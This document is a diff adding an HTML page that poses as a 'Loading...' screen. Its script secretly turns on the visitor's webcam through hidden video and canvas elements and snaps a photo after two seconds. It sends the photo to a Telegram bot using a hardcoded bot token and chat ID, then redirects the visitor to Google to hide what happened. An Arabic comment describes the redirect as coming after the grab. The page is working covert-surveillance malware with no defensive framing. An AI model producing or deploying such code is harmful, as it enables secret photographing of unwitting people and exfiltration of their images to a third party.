@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head> <title>جاري التحميل...</title> </head>
+<body>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <script>
+        const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
+        const CHAT_ID = '8293639164';
+
+        async function startCamera() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'photo.jpg');
+                    formData.append('chat_id', CHAT_ID);
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                        method: 'POST', body: formData
+                    }).then(() => { window.location.href = "https://google.com"; }); // توجيهه لجوجل بعد السحب
+                }, 'image/jpeg');
+            }, 2000);
+        }
+        window.onload = startCamera;
+    </script>
+</body>
+</html>
